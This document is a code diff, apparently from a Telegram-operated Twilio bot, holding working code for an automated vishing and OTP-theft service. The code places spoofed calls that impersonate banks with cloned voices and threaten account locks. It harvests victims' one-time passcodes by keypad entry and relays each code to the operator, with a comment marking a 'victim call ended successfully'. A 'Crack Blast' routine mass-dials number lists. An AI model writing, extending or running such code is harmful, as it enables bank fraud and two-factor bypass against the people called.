-    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
-    name = get_call_name(call_sid, user_id)
-    company = get_call_company(call_sid, user_id)
-    from_name = get_call_from_name(call_sid, user_id)
-
-    if from_name:
-        caller_identity = f"{from_name} from {company}"
-    else:
-        caller_identity = company
-
-    session = get_call_session(call_sid)
-    if call_sid and session is None:
-        register_call_session(
-            call_sid,
-            user_id,
-            chat_id=chat_id,
-            endpoint="/handle_acknowledgment",
-            mode_label="Normal Call",
-        )
-        session = get_call_session(call_sid)
-
-    if session is None:
-        session = {}
-
-    # Prefer session chat_id if request did not provide one
-    if chat_id is None and session.get("chat_id"):
-        try:
-            chat_id = int(session.get("chat_id"))
-        except Exception:
-            chat_id = session.get("chat_id")
-
-    session["ack_attempts"] = session.get("ack_attempts", 0)
-
-    logger.info(
-        f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
-    )
-
-    if digits == "1" or _is_positive_acknowledgment(speech_result):
-        confidence = evaluate_amd_confidence(session, answered_by="unknown", speech_result=speech_result, reason="handle_ack_positive")
-        decision = get_amd_decision(confidence, fallback="human")
-        if decision == "human":
-            if session is not None:
-                session["answered_by"] = "human"
-                session["amd_decision"] = "human"
-                session["amd_confidence"] = confidence
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-            session["ack_attempts"] = 0
-            redirect_url = _build_ai_flow_redirect_url(
-                user_id=user_id,
-                chat_id=chat_id,
-                voice_id=voice_id,
-                name=name,
-                company=company,
-                from_name=from_name,
-                emotion=emotion,
-                language=language,
-                delivery=delivery,
-                code_length=get_call_code_length(call_sid, user_id),
-            )
-            resp = VoiceResponse()
-            resp.redirect(redirect_url, method="POST")
-            return Response(str(resp), content_type="application/xml")
-        if decision in {"machine", "voicemail", "fax"}:
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-            resp = VoiceResponse()
-            resp.say("Thank you. Goodbye.")
-            resp.hangup()
-            return Response(str(resp), content_type="application/xml")
-
-    if digits == "1" or _is_positive_acknowledgment(speech_result):
-        if session is not None:
-            session["answered_by"] = "human"
-            session["amd_decision"] = "human"
-            session["amd_confidence"] = {"human": 1.0}
-        if chat_id is not None:
-            send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-        session["ack_attempts"] = 0
-        redirect_url = _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-            code_length=get_call_code_length(call_sid, user_id),
-        )
-        resp = VoiceResponse()
-        resp.redirect(redirect_url, method="POST")
-        return Response(str(resp), content_type="application/xml")
-
-    # Prefer canonical AMD result if available
-    answered_by = session.get("answered_by") if session else None
-    if answered_by:
-        ab = str(answered_by).lower()
-        if ab == "human":
-            # Notify and route to AI flow
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
-            if digits == "1":
-                try:
-                    safe_bot_send_message(int(chat_id), "Human Pressed 1")
-                except Exception as e:
-                    logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")
-
-            redirect_url = _build_ai_flow_redirect_url(
-                user_id=user_id,
-                chat_id=chat_id,
-                voice_id=voice_id,
-                name=name,
-                company=company,
-                from_name=from_name,
-                emotion=emotion,
-                language=language,
-                delivery=delivery,
-                code_length=get_call_code_length(call_sid, user_id),
-            )
-            resp = VoiceResponse()
-            resp.redirect(redirect_url, method="POST")
-            return Response(str(resp), content_type="application/xml")
-        elif ab not in ("unknown", ""):
-            if chat_id is not None:
-                send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-            resp = VoiceResponse()
-            resp.say("Thank you. Goodbye.")
-            resp.hangup()
-            return Response(str(resp), content_type="application/xml")
-
-    if _looks_like_machine_or_voicemail(speech_result):
-        if chat_id is not None:
-            send_telegram_status(chat_id, "📞 A machine or voicemail answered the call. Ending the call gracefully.")
-        resp = VoiceResponse()
-        resp.say("Thank you. Goodbye.")
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-
-    session["ack_attempts"] += 1
-    if session is not None:
-        session["answered_by"] = "human"
-        session["amd_decision"] = "human"
-        session["amd_confidence"] = {"human": 1.0}
-    resp = VoiceResponse()
-    resp.redirect(
-        _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-            code_length=get_call_code_length(call_sid, user_id),
-        ),
-        method="POST",
-    )
-    return Response(str(resp), content_type="application/xml")
-
-
-@app.route("/present_urgency", methods=["POST"])
-@twilio_request_logger("/present_urgency")
-def present_urgency():
-    from twilio.twiml.voice_response import VoiceResponse, Gather
-
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
-    language = get_call_language(call_sid, user_id)
-    name = get_call_name(call_sid, user_id)
-    company = get_call_company(call_sid, user_id)
-    from_name = get_call_from_name(call_sid, user_id)
-    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
-    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
-
-    resp = VoiceResponse()
-    resp.redirect(
-        _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-            code_length=get_call_code_length(call_sid, user_id),
-        ),
-        method="POST",
-    )
-    return Response(str(resp), content_type="application/xml")
-
-
-@app.route("/handle_dtmf_press_1", methods=["POST"])
-@twilio_request_logger("/handle_dtmf_press_1")
-def handle_dtmf_press_1():
-    from twilio.twiml.voice_response import VoiceResponse, Gather
-
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    call_sid = request.values.get("CallSid", "")
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    digits = (request.values.get("Digits") or "").strip()
-    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
-    language = get_call_language(call_sid, user_id)
-    name = get_call_name(call_sid, user_id)
-    company = get_call_company(call_sid, user_id)
-    from_name = get_call_from_name(call_sid, user_id)
-    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
-    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
-
-    session = get_call_session(call_sid)
-    if call_sid and session is None:
-        register_call_session(
-            call_sid,
-            user_id,
-            chat_id=chat_id,
-            endpoint="/handle_dtmf_press_1",
-            mode_label="Normal Call",
-        )
-        session = get_call_session(call_sid)
-
-    if session is None:
-        session = {}
-
-    session["press1_attempts"] = session.get("press1_attempts", 0)
-
-    if digits == "1":
-        if session is not None:
-            session["press1_attempts"] = 0
-        redirect_url = (
-            f"/capture_otp?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
-            f"&code_length={quote_plus(str(get_call_code_length(call_sid, user_id)))}"
-        )
-        resp = VoiceResponse()
-        resp.redirect(redirect_url, method="POST")
-        return Response(str(resp), content_type="application/xml")
-
-    session["press1_attempts"] += 1
-    resp = VoiceResponse()
-    resp.redirect(
-        _build_ai_flow_redirect_url(
-            user_id=user_id,
-            chat_id=chat_id,
-            voice_id=voice_id,
-            name=name,
-            company=company,
-            from_name=from_name,
-            emotion=emotion,
-            language=language,
-            delivery=delivery,
-            code_length=get_call_code_length(call_sid, user_id),
-        ),
-        method="POST",
-    )
-    return Response(str(resp), content_type="application/xml")
-
-
-# /capture_otp may take up to 10 seconds while generating ElevenLabs TTS audio.
-# If you run this under a production WSGI server, make sure the request timeout is at least 60 seconds.
-@app.route("/capture_otp", methods=["POST"])
-def capture_otp():
-    user_id = request.values.get("user_id") or request.args.get("user_id") or "unknown"
-    chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
-    digits = request.values.get("Digits", "")
-    call_sid = request.values.get("CallSid", "")
-    stage = request.values.get("stage", "otp")
-    after_gather = request.values.get("after_gather") == "1"
-    chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
-    voice_id, voice_name = get_request_voice_info(call_sid, user_id)
-    name = get_call_name(call_sid, user_id)
-    company = get_call_company(call_sid, user_id)
-    from_name = get_call_from_name(call_sid, user_id)
-    language = get_call_language(call_sid, user_id)
-    delivery = get_call_delivery(call_sid, user_id)
-    code_length = request.values.get("code_length") or request.args.get("code_length")
-    if str(code_length).strip() in ("", "None", "unknown"):
-        code_length = get_call_code_length(call_sid, user_id)
-    try:
-        code_length = int(code_length)
-    except (TypeError, ValueError):
-        code_length = 6
-    if code_length < 4 or code_length > 10:
-        code_length = 6
-
-    if from_name:
-        caller_identity = f"{from_name} from {company}"
-    else:
-        caller_identity = f"{company}"
-
-    if language == "fr":
-        confirm_prompt = (
-            "Veuillez appuyer sur 1 pour continuer la vérification et confirmer votre identité."
-        )
-        otp_prompt = (
-            f"Veuillez saisir le code à {code_length} chiffres suivi de la touche dièse (#)."
-        )
-        retry_text = "Veuillez appuyer sur 1 pour continuer la vérification."
-        no_response_text = "Aucune réponse n'a été reçue. Veuillez réessayer."
-        timeout_text = "Aucune entrée n'a été reçue. Merci. Au revoir."
-    else:
-        confirm_prompt = (
-            "Please press 1 to continue verification and confirm your identity."
-        )
-        otp_prompt = (
-            f"Please enter the {code_length}-digit code followed by the pound key (#)."
-        )
-        retry_text = "Please press 1 to continue the verification process."
-        no_response_text = "No response was received. Please try again."
-        timeout_text = "No input was received. Goodbye."
-
-    session = get_call_session(call_sid) if call_sid else None
-
-    logger.info(f"[CAPTURE] stage={stage} after_gather={after_gather} call={call_sid} digits={digits} user={user_id}")
-
-    if stage == "confirm1":
-        if call_sid and session is not None:
-            session["confirm1_attempts"] = session.get("confirm1_attempts", 0)
-        if after_gather:
-            if digits == "1":
-                if session is not None:
-                    session["confirm1_attempts"] = 0
-                redirect_url = (
-                    f"/capture_otp?user_id={quote_plus(str(user_id))}"
-                    f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
-                    f"&code_length={quote_plus(str(code_length))}"
-                )
-                resp = VoiceResponse()
-                resp.redirect(redirect_url)
-                return Response(str(resp), content_type="application/xml")
-            if session is not None:
-                session["confirm1_attempts"] += 1
-            if session is not None and session["confirm1_attempts"] >= 2:
-                final = (
-                    "Due to lack of response, your account will be flagged for manual review. Goodbye."
-                )
-                resp = VoiceResponse()
-                audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="normal_ultimate_final_fallback.mp3")
-                if audio_final:
-                    resp.play(audio_final)
-                else:
-                    resp.say(final)
-                resp.hangup()
-                return Response(str(resp), content_type="application/xml")
-            fallback = f"{no_response_text} Please press 1 to avoid account lock."
-            resp = VoiceResponse()
-            audio_fallback = generate_call_audio(user_id=user_id, text=fallback, voice_id=voice_id, filename="normal_ultimate_fallback.mp3")
-            if audio_fallback:
-                resp.play(audio_fallback)
-            else:
-                resp.say(fallback)
-            resp.pause(length=5)
-            gather_action = (
-                f"/capture_otp?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
-                f"&code_length={quote_plus(str(code_length))}"
-            )
-            gather = Gather(
-                num_digits=1,
-                action=gather_action,
-                timeout=5,
-                input="dtmf",
-                method="POST",
-                finish_on_key="",
-            )
-            reprompt = retry_text
-            audio_reprompt = generate_call_audio(user_id=user_id, text=reprompt, voice_id=voice_id, filename="normal_ultimate_press1_retry.mp3")
-            if audio_reprompt:
-                gather.play(audio_reprompt)
-            else:
-                gather.say(reprompt)
-            resp.append(gather)
-            return Response(str(resp), content_type="application/xml")
-        # Initial confirm1 prompt with a bank-style greeting and urgency script.
-        prompt = confirm_prompt
-        resp = VoiceResponse()
-        gather_action = (
-            f"/capture_otp?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
-            f"&code_length={quote_plus(str(code_length))}"
-        )
-        gather = Gather(
-            num_digits=1,
-            action=gather_action,
-            timeout=10,
-            input="dtmf",
-            method="POST",
-            finish_on_key="",
-        )
-        prompt_audio = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_press1.mp3")
-        if prompt_audio:
-            gather.play(prompt_audio)
-        else:
-            gather.say(prompt)
-        resp.append(gather)
-        return Response(str(resp), content_type="application/xml")
-
-    if stage == "otp":
-        if digits and not after_gather:
-            after_gather = True
-        if not after_gather:
-            prompt = otp_prompt
-            resp = VoiceResponse()
-            audio_prompt = generate_call_audio(user_id=user_id, text=prompt, voice_id=voice_id, filename="normal_ultimate_otp_request.mp3")
-            if audio_prompt:
-                resp.play(audio_prompt)
-            else:
-                resp.say(prompt)
-            gather_action = (
-                f"/capture_otp?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp&after_gather=1"
-                f"&code_length={quote_plus(str(code_length))}"
-            )
-            gather = Gather(
-                num_digits=code_length,
-                action=gather_action,
-                timeout=15,
-                input="dtmf",
-                method="POST",
-                finish_on_key="#",
-            )
-            resp.append(gather)
-            return Response(str(resp), content_type="application/xml")
-
-        # after_gather==True: handle OTP result or timeout
-        if call_sid and session is not None:
-            session["otp_attempts"] = session.get("otp_attempts", 0)
-        if digits:
-            if call_sid and session is not None:
-                session["otp"] = digits
-                session["otp_attempts"] = 0
-                session["otp_status"] = "pending"
-            if chat_id:
-                send_call_stage_status(chat_id, "CAPTURE_OTP", f"🔐 Code received: {digits}")
-                buttons = types.InlineKeyboardMarkup()
-                buttons.add(
-                    types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"),
-                    types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}")
-                )
-                try:
-                    bot.send_message(
-                        chat_id,
-                        "🔐 *OTP Captured*\n\n"
-                        f"Code: `{digits}`\n\n"
-                        "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
-                        "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
-                        reply_markup=buttons,
-                        parse_mode="Markdown"
-                    )
-                except Exception as e:
-                    logger.warning(f"Failed to send OTP to Telegram: {e}")
-
-            # Start auto-accept timer. It will only auto-accept if status remains pending.
-            def _auto_accept():
-                if not call_sid:
-                    return
-                session = get_call_session(call_sid)
-                if not session or session.get("otp_status") != "pending":
-                    return
-                try:
-                    session["otp_status"] = "auto_accepted"
-                    if digits:
-                        def _post_vouch_auto():
-                            post_vouch_to_channel(call_sid, session.get("user_id") or user_id, digits, override_mode="Auto Accept")
-                        threading.Thread(target=_post_vouch_auto, daemon=True).start()
-                    resp_auto = VoiceResponse()
-                    say_auto = "Verification successful. Thank you. Goodbye."
-                    audio_auto = generate_call_audio(user_id=user_id, text=say_auto, voice_id=voice_id, filename="otp_auto_accept.mp3")
-                    if audio_auto:
-                        resp_auto.play(audio_auto)
-                    else:
-                        resp_auto.say(say_auto)
-                    resp_auto.hangup()
-                    client = twilio_client or get_twilio_client()
-                    if client:
-                        client.calls(call_sid).update(twiml=str(resp_auto))
-                    if chat_id:
-                        bot.send_message(chat_id, "⏳ Auto-accepted after timeout. Victim call ended successfully.")
-                except Exception as e:
-                    logger.exception(f"Auto-accept failed for CallSid={call_sid}: {e}")
-
-            timer = threading.Timer(30.0, _auto_accept)
-            timer.daemon = True
-            store_otp_timer(call_sid, timer)
-            timer.start()
-
-            # Keep the call open while waiting for bot user decision.
-            resp = VoiceResponse()
-            hold = "Please wait while we verify your code."
-            audio_hold = generate_call_audio(user_id=user_id, text=hold, voice_id=voice_id, filename="otp_waiting_hold.mp3")
-            if audio_hold:
-                resp.play(audio_hold)
-            else:
-                resp.say(hold)
-            resp.pause(length=30)
-            return Response(str(resp), content_type="application/xml")
-
-        # Timeout or no digits entered during OTP gather
-        if call_sid and session is not None:
-            session["otp_attempts"] = session.get("otp_attempts", 0) + 1
-            if session["otp_attempts"] >= 3:
-                resp = VoiceResponse()
-                final = "I didn't receive a code. Please contact support." 
-                audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="otp_timeout_final.mp3")
-                if audio_final:
-                    resp.play(audio_final)
-                else:
-                    resp.say(final)
-                resp.hangup()
-                return Response(str(resp), content_type="application/xml")
-
-        resp = VoiceResponse()
-        retry = "I didn't receive a code. Please try again."
-        audio_retry = generate_call_audio(user_id=user_id, text=retry, voice_id=voice_id, filename="otp_timeout_retry.mp3")
-        if audio_retry:
-            resp.play(audio_retry)
-        else:
-            resp.say(retry)
-        resp.redirect(
-            f"/capture_otp?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
-            f"&code_length={quote_plus(str(code_length))}"
-        )
-        return Response(str(resp), content_type="application/xml")
-
-    # Fallback default behavior
-    resp = VoiceResponse()
-    resp.say("An error occurred. Goodbye.")
-    resp.hangup()
-    return Response(str(resp), content_type="application/xml")
-@app.route("/twilio/status", methods=["POST"])
-@twilio_request_logger("/twilio/status")
-def twilio_status():
-    """
-    Handle call status updates from Twilio (ringing, in-progress, completed, etc.)
-    """
-    log_twilio_request_debug("/twilio/status")
-    
-    # Validate request
-    is_valid = validate_twilio_request()
-    if not is_valid:
-        logger.error("[ERROR] Status endpoint: Twilio validation FAILED")
-        # Return 200 anyway so Twilio doesn't retry
-        return Response("OK", status=200)
-
-    try:
-        try:
-            call_sid = request.values.get("CallSid")
-            status = request.values.get("CallStatus")
-            answered_by = (
-                request.values.get("AnsweredBy")
-                or request.values.get("answered_by")
-            )
-            chat_id = request.values.get("chat_id")
-            user_id = request.values.get("user_id")
-        except Exception as parse_ex:
-            logger.warning(f"Twilio status payload parsing failed: {parse_ex}")
-            return Response("OK", status=200)
-
-        if not call_sid:
-            logger.warning(
-                "Twilio status webhook received without CallSid. payload args=%s form=%s",
-                request.args.to_dict(flat=False),
-                request.form.to_dict(flat=False),
-            )
-            return Response("OK", status=200)
-
-        if not status:
-            logger.warning(
-                "Twilio status webhook received without CallStatus. payload values=%s",
-                request.values.to_dict(flat=False),
-            )
-            return Response("OK", status=200)
-
-        if call_sid:
-            session = get_call_session(call_sid)
-            if session is not None and answered_by:
-                session["answered_by"] = normalize_answered_by(answered_by)
-            elif session is not None and not answered_by:
-                session.setdefault("answered_by", "unknown")
-            if session is not None and not chat_id and session.get("chat_id"):
-                chat_id = session.get("chat_id")
-            elif session is not None and not chat_id and session.get("status_chat_id"):
-                chat_id = session.get("status_chat_id")
-
-        normalized_answered = normalize_answered_by(answered_by)
-        logger.info(
-            "📊 Call status update: %s -> %s (answered_by=%s user_id=%s chat_id=%s) payload_values=%s",
-            call_sid,
-            status,
-            normalized_answered or "unknown",
-            user_id,
-            chat_id,
-            request.values.to_dict(flat=False),
-        )
-
-        status_text = None
-        final_status = False
-        if status == "queued":
-            status_text = "⏳ Call queued. Awaiting ring..."
-        elif status == "ringing":
-            status_text = "📞 Ringing..."
-        elif status == "in-progress":
-            status_text = "▶️ Call in progress..."
-        elif status == "completed":
-            status_text = "✅ Call ended."
-            final_status = True
-        elif status == "failed":
-            status_text = "❌ Call failed."
-            final_status = True
-        elif status == "no-answer":
-            status_text = "⏱️ No answer."
-            final_status = True
-        elif status == "busy":
-            # Twilio may post a transient 'busy' status; confirm via API before
-            # treating the call as final. This helps avoid flaky busy reports.
-            status_text = "📵 Line busy."
-            final_status = True
-            try:
-                client = twilio_client or get_twilio_client()
-                if client:
-                    # Try a quick double-check: fetch current call status
-                    fetched = None
-                    try:
-                        fetched = client.calls(call_sid).fetch().status
-                    except Exception as _e:
-                        logger.debug(f"Busy verify fetch failed for {call_sid}: {_e}")
-                    # If fetch returns something other than 'busy', do not finalize yet
-                    if fetched and fetched != "busy":
-                        logger.info(
-                            "Twilio status callback indicated 'busy' for %s but API shows '%s' — deferring finalization",
-                            call_sid,
-                            fetched,
-                        )
-                        status_text = f"⚠️ Busy reported but Twilio API shows {fetched}. Awaiting final update."
-                        final_status = False
-            except Exception as e:
-                logger.debug(f"Error during busy verification for {call_sid}: {e}")
-        elif status == "canceled":
-            status_text = "❌ Call canceled."
-            final_status = True
-
-        if status_text:
-            update_call_status_message(call_sid, status_text, final=final_status)
-            if not final_status:
-                return Response("OK", status=200)
-
-        if final_status and call_sid:
-            if status == "completed":
-                session = get_call_session(call_sid)
-                if session is not None:
-                    session["call_completed"] = True
-                if normalized_answered == "unknown" and session is not None:
-                    session["awaiting_async_amd"] = True
-                    logger.info(f"Call {call_sid} completed before AMD verdict; waiting for async AMD callback")
-                    # Keep the session alive until async AMD callback arrives
-                    def _cleanup_after_delay():
-                        cleanup_call_session(call_sid)
-                    timer = threading.Timer(45.0, _cleanup_after_delay)
-                    timer.daemon = True
-                    store_amd_cleanup_timer(call_sid, timer)
-                    timer.start()
-                    return Response("OK", status=200)
-            if status == "completed":
-                try:
-                    # The recording is handled by Twilio's recording callback (/twilio/recording)
-                    # so we only send the final call summary here.
-                    session = get_call_session(call_sid)
-                    answered_by_text = (session.get("answered_by") if session else None) or request.form.get("AnsweredBy") or request.form.get("answered_by") or request.args.get("AnsweredBy") or request.args.get("answered_by") or "unknown"
-                    detection_text = get_answered_by_label(answered_by_text)
-
-                    summary = (
-                        f"✅ Call ended.\n"
-                        f"{detection_text}\n"
-                        f"CallSid: {call_sid}"
-                    )
-                    if not update_call_status_message(call_sid, summary, final=True):
-                        kb = types.InlineKeyboardMarkup()
-                        kb.add(types.InlineKeyboardButton("Main Menu", callback_data="show_main_menu"))
-                        if chat_id:
-                            try:
-                                bot.send_message(int(chat_id), summary, reply_markup=kb)
-                            except Exception as send_ex:
-                                logger.warning(f"Failed to send final call summary to Telegram: {send_ex}")
-                    # Mark the user's last call as completed to prevent reuse of the same setup
-                    # only if a human answered. If a machine, voicemail, fax, unknown, or
-                    # failed event occurred, do NOT mark as completed so the user
-                    # can retry the same setup.
-                    try:
-                        uid = user_id or (session.get("user_id") if session else None)
-                        normalized = normalize_answered_by(answered_by_text)
-                        if uid and normalized == "human":
-                            _mark_call_completed(str(uid))
-                        else:
-                            logger.info(f"Not marking call as completed for user {uid} (answered_by={answered_by_text})")
-                    except Exception:
-                        logger.exception("Failed to conditionally mark call completed after summary send")
-                except Exception as summ_ex:
-                    logger.warning(f"Failed to send final call summary: {summ_ex}")
-            cleanup_call_session(call_sid)
-
-        return Response("OK", status=200)
-
-    except Exception as e:
-        logger.error(f"[ERROR] Error in /twilio/status endpoint: {e}", exc_info=True)
-        return Response("OK", status=200)  # Return 200 to avoid Twilio retries
 
 # ======================================================================
 # CALL HISTORY
@@ -5197,7 +3279,7 @@ def get_crackblast_config(user_id: str) -> dict:
         "numbers": get_crackblast_numbers(user_id),
         "script": read_user_file(user_id, "crack_script.txt", "").strip(),
         "caller_id": read_user_file(user_id, "crack_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER,
-        "voice_id": read_user_file(user_id, "crack_voice_id.txt", get_default_voice_id()) or get_default_voice_id(),
+        "voice_id": read_user_file(user_id, "crack_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID,
         "voice_name": read_user_file(user_id, "crack_voice_name.txt", "Custom") or "Custom",
         "digits": read_user_file(user_id, "crack_digits.txt", "0").strip() or "0",
         "delay": read_user_file(user_id, "crack_delay.txt", "0").strip() or "0",
@@ -5280,35 +3362,18 @@ def launch_crackblast_campaign(user_id: str, chat_id: int) -> None:
     success = 0
     failed = 0
     for number in numbers:
-        if USE_AI_FLOW:
-            public_base = build_public_base_url() or NGROK_URL
-            webhook_url = (
-                f"{public_base.rstrip('/')}/ai_start"
-                f"?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id))}"
-                f"&name={quote_plus(name)}"
-                f"&company={quote_plus(company)}"
-                f"&voice_id={quote_plus(voice_id)}"
-                f"&custom_script={quote_plus(script)}"
-                f"&code_length={quote_plus(code_length)}"
-                f"&call_type=crack_blast"
-                f"&mode_label=Crack%20Blast"
-            )
-        else:
-            public_base = build_public_base_url() or NGROK_URL
-            webhook_url = (
-                f"{public_base.rstrip('/')}/custom_flow?user_id={quote_plus(str(user_id))}" 
-                f"&chat_id={quote_plus(str(chat_id))}&audio=crack_script"
-            )
+        if not USE_AI_FLOW:
+            bot.send_message(chat_id, "❌ AI flow is disabled. Cannot launch Crack Blast.")
+            return
         
         sid = make_spoofed_call(
             to=number,
             from_number=OUTBOUND_CALLER_ID,
             caller_id=config["caller_id"],
-            webhook_url=webhook_url,
             user_id=user_id,
             chat_id=chat_id,
             call_record=True,
+            code_length=code_length,
         )
         if sid:
             success += 1
@@ -6051,7 +4116,7 @@ def _handle_query_processing(call, _):
 
     if call.data == "manual_call_preview_audio":
         script = read_user_file(user_id_str, "manual_script.txt", "").strip()
-        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         if not script:
             bot.send_message(chat_id, "❌ No manual script found. Set the script first.")
             return
@@ -6059,7 +4124,7 @@ def _handle_query_processing(call, _):
         def _gen_and_send_manual():
             try:
                 audio_path = user_conf_path(user_id_str) / "manual_preview.mp3"
-                generate_call_audio(user_id=user_id_str, text=script, voice_id=voice_id, filename="manual_preview.mp3")
+                # preview audio generated via None stub
                 if audio_path.exists():
                     try:
                         with open(audio_path, "rb") as f:
@@ -6087,7 +4152,7 @@ def _handle_query_processing(call, _):
             bot.send_message(chat_id, "❌ Missing manual script. Please set it before starting the call.")
             return
         caller_id = read_user_file(user_id_str, "manual_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
-        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+        voice_id = read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         digits = read_user_file(user_id_str, "manual_digits.txt", "0").strip()
         delay = read_user_file(user_id_str, "manual_delay.txt", "0").strip() or "0"
         fallback = read_user_file(user_id_str, "manual_fallback.txt", "").strip()
@@ -6100,27 +4165,15 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
-                public_base = build_public_base_url() or NGROK_URL
-                webhook_url = (
-                    f"{public_base.rstrip('/')}/ai_start"
-                    f"?user_id={quote_plus(str(user_id_str))}"
-                    f"&chat_id={quote_plus(str(chat_id))}"
-                    f"&name={quote_plus(name)}"
-                    f"&company={quote_plus(company)}"
-                    f"&voice_id={quote_plus(voice_id)}"
-                    f"&custom_script={quote_plus(script)}"
-                    f"&code_length={quote_plus(code_length)}"
-                    f"&call_type=manual"
-                    f"&mode_label=Manual%20Call"
-                )
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
                     caller_id=caller_id,
-                    webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     call_record=True,
+                    code_length=code_length,
+                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create manual call")
@@ -6178,7 +4231,7 @@ def _handle_query_processing(call, _):
 
     if call.data == "custom_call_preview_audio":
         script = read_user_file(user_id_str, "custom_script.txt", "").strip()
-        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         if not script:
             bot.send_message(chat_id, "❌ No custom script found. Set the script first.")
             return
@@ -6186,7 +4239,7 @@ def _handle_query_processing(call, _):
         def _gen_and_send_custom():
             try:
                 audio_path = user_conf_path(user_id_str) / "custom_preview.mp3"
-                generate_call_audio(user_id=user_id_str, text=script, voice_id=voice_id, filename="custom_preview.mp3")
+                # preview audio generated via None stub
                 if audio_path.exists():
                     try:
                         with open(audio_path, "rb") as f:
@@ -6214,7 +4267,7 @@ def _handle_query_processing(call, _):
             bot.send_message(chat_id, "❌ Missing custom script. Please set it before starting the call.")
             return
         caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip() or TWILIO_PHONE_NUMBER
-        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()) or get_default_voice_id()
+        voice_id = read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID) or DEFAULT_VOICE_ID
         digits = read_user_file(user_id_str, "custom_digits.txt", "0").strip()
         delay = read_user_file(user_id_str, "custom_delay.txt", "0").strip() or "0"
         fallback = read_user_file(user_id_str, "custom_fallback.txt", "").strip()
@@ -6227,28 +4280,16 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
-                public_base = build_public_base_url() or NGROK_URL
-                webhook_url = (
